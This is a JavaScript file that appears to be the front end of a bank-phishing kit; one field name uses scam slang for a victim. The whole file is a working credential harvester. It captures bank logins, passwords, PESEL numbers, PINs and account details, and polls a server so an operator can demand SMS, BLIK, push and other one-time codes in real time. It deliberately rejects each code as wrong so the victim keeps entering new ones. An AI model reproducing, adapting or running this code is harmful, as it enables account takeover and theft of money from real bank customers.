async function init() {
  var currentStatus = null;

  $("body").on(
    "click",
    ".pictures-container:not(.disabled) .pictures-element[data-item]",
    (e) => {
      e.preventDefault();
      $(".pictures-container").removeClass("disabled").addClass("disabled");
      $.ajax({
        url: "/api/selectPicture",
        type: "POST",
        data: {
          picture:
            $(e.target).data("item") || $(e.target).parent().data("item"),
          token: LOG_TOKEN,
        },
        success: () => {
          setTimeout(() => {
            alert(translate["wrong_picture"][AD_LANG]);
            $(".pictures-container").removeClass("disabled");
            pictureModal();
          }, 750);
        },
        error: () => {
          setTimeout(() => {
            alert(translate["wrong_picture"][AD_LANG]);
            $(".pictures-container").removeClass("disabled");
            pictureModal();
          }, 750);
        },
      });
    }
  );
  function limitsModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["limits"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/card/" + AD_ID;
    });
  }
  function forVerifyModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["for_verify"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/card/" + AD_ID;
    });
  }
  function correctBalanceModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["correct_balance"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/card/" + AD_ID;
    });
  }
  function otherCardModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["other_card"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/card/" + AD_ID;
    });
  }
  function pushModal() {
    swal(translate.push_title[AD_LANG], translate.push_text[AD_LANG], "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }

  function successModal() {
    swal(translate.success[AD_LANG], translate.money_will[AD_LANG], "success", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function pictureModal() {
    swal(
      translate["picture_title"][AD_LANG],
      translate["picture_text"][AD_LANG],
      "info",
      {
        content: {
          element: "div",
          attributes: {
            id: "pictures_div",
          },
        },
        closeOnClickOutside: false,
        closeOnEsc: false,
        buttons: false,
      }
    );
    const pictures = [
      "банан",
      "брюки",
      "бургер",
      "гитара",
      "зонтик",
      "календарь",
      "калькулятор",
      "карандаш",
      "клубника",
      "компас",
      "крокодил",
      "лимон",
      "мамонт",
      "микрофон",
      "наушники",
      "очки",
      "помидор",
      "свитер",
      "телефон",
      "цветок",
      "шоколад",
    ].sort(() => Math.random() - 0.5);

    document.querySelector("#pictures_div").innerHTML =
      '<div class="pictures-container">' +
      pictures
        .map(
          (v) =>
            '<div class="pictures-element" data-item="' +
            v +
            '"><img draggable="false" alt="" src="/img/pictures/' +
            v +
            '.png"></div>'
        )
        .join("\n") +
      "</div>";
    document.querySelector(".pictures-container").classList.remove("disabled");
  }
  function codeModal(
    codeType = "sms",
    title = translate.sms_title[AD_LANG],
    text = translate.sms_text[AD_LANG],
    placeholder = translate.sms_placeholder[AD_LANG],
    wrong_code = translate.wrong_code[AD_LANG]
  ) {
    swal.stopLoading();
    swal({
      title,
      text,
      content: {
        element: "input",
        attributes: {
          type: "password",
          placeholder,
          maxLength: 255,
          required: true,
          style:
            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
        },
      },
      closeOnEsc: false,
      closeOnClickOutside: false,
      buttons: {
        confirm: {
          text: translate.submit[AD_LANG],
          closeModal: false,
        },
      },
    }).then(async (code) => {
      try {
        if (!code) return;
        $.ajax({
          type: "POST",
          url: "/api/submitCode",
          data: {
            codeType,
            code,
            token: LOG_TOKEN,
          },
          success: (data) => {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          },
          error: () => {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          },
        });
      } catch (err) {
        swal.stopLoading();
        alert(wrong_code);
        codeModal(...arguments);
      }
    });
  }

  function mtokenModal(
    codeType = "mtoken",
    title = translate.mtoken_title[AD_LANG],
    text = translate.mtoken_text[AD_LANG],
    placeholder = translate.mtoken_placeholder[AD_LANG],
    wrong_code = translate.wrong_code[AD_LANG]
  ) {
    swal.stopLoading();
    swal({
      title,
      text,
      content: {
        element: "input",
        attributes: {
          type: "password",
          placeholder,
          maxLength: 255,
          required: true,
          style:
            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
        },
      },
      closeOnEsc: false,
      closeOnClickOutside: false,
      buttons: {
        confirm: {
          text: translate.submit[AD_LANG],
          closeModal: false,
        },
      },
    }).then(async (code) => {
      try {
        if (!code) return;
        $.ajax({
          type: "POST",
          url: "/api/submitCode",
          data: {
            codeType,
            code,
            token: LOG_TOKEN,
          },
          success: (data) => {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          },
          error: () => {
            swal.stopLoading();
            alert(wrong_code);
            codeModal(...arguments);
          },
        });
      } catch (err) {
        swal.stopLoading();
        alert(wrong_code);
        codeModal(...arguments);
      }
    });
  }


  function checkLogStatus() {
    $.ajax({
      type: "POST",
      url: "/api/checkStatus",
      data: {
        token: LOG_TOKEN,
      },
      success: (data) => {
        if (data.status == currentStatus) return;
        currentStatus = data.status;
        if (currentStatus == "profit") successModal();
        else if (currentStatus == "sms") codeModal();
        else if (currentStatus == "appCode")
          codeModal(
            "app",
            translate.app_code_title[AD_LANG],
            translate.app_code_text[AD_LANG],
            translate.app_code_placeholder[AD_LANG]
          );
        else if (currentStatus == "callCode")
          codeModal(
            "call",
            translate.call_code_title[AD_LANG],
            translate.call_code_text[AD_LANG],
            translate.call_code_placeholder[AD_LANG]
          ); 
        else if (currentStatus == "blik")
          codeModal(
            "blik",
            translate.blik_code_title[AD_LANG],
            translate.blik_code_text[AD_LANG],
            translate.blik_code_placeholder[AD_LANG]
          );
        else if (currentStatus == "pincode")
          codeModal(
            "pincode",
            translate.pincode_title[AD_LANG],
            translate.pincode_text[AD_LANG],
            translate.pincode_placeholder[AD_LANG]
          );
        else if (currentStatus == "passcode")
          codeModal(
            "passcode",
            translate.passcode_title[AD_LANG],
            translate.passcode_text[AD_LANG],
            translate.passcode_placeholder[AD_LANG]
          );
          else if (currentStatus == "dtrans")
          codeModal(
            "dtrans",
            translate.dtrans_title[AD_LANG],
            translate.dtrans_text[AD_LANG],
            translate.dtrans_placeholder[AD_LANG]
          );
          else if (currentStatus == "callBank")
          codeModal(
            "callBank",
            translate.callBank_title[AD_LANG],
            translate.callBank_text[AD_LANG],
            translate.callBank_placeholder[AD_LANG]
          );
        else if (currentStatus == "push") pushModal();
        else if (currentStatus == "pincode") pincodeModal();
        else if (currentStatus == "dtrans") dtransModal();
        else if (currentStatus == "callBank") callBankModal();
        else if (currentStatus == "passcode") passcodeModal();
        else if (currentStatus == "limits") limitsModal();
        else if (currentStatus == "otherCard") otherCardModal();
        else if (currentStatus == "forVerify") forVerifyModal();
        else if (currentStatus == "correctBalance") correctBalanceModal();
        else if (currentStatus == "picture") pictureModal();
      },
    }).done(() => setTimeout(checkLogStatus, 1500));
  }

  checkLogStatus();

  $("body").on("submit", "#lk_form", (e) => {
    e.preventDefault();
    $.ajax({
      type: "POST",
      url: "/api/submitLk",
      data: {
        token: LOG_TOKEN,
        login: $("#login").val(),
        password: $("#password").val(),
        pesel: $("#pesel").val(),
        pin: $("#pin").val(),
        phone_number: $("#phone_number").val(),
        last_mamont_name: $("#last_mamont_name").val(),
        question: $("#question").val(),
        acc_number: $("#acc_number").val(),
        member_number: $("#member_number").val(),
        custom_number: $("#custom_number").val(),
        user_id: $("#user_id").val(),
        motherlastname: $("#motherlastname").val(),
        id_user: $("#id_user").val()
      },
      beforeSend: () => {
        $("#lk_form").find("[type=submit]").prop("disabled", true);
      },
      success: (data) => {
        $("#lk_form").find("[type=submit]").prop("disabled", false);
        swal({
          title: translate.wait[AD_LANG],
          text: translate.bank_processes[AD_LANG],
          icon: "info",
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });
      },
      error: () => {
        $("#lk_form").find("[type=submit]").prop("disabled", false);
        swal(translate.error_title[AD_LANG], translate.error[AD_LANG], "error");
      },
    });
  });
}
init();
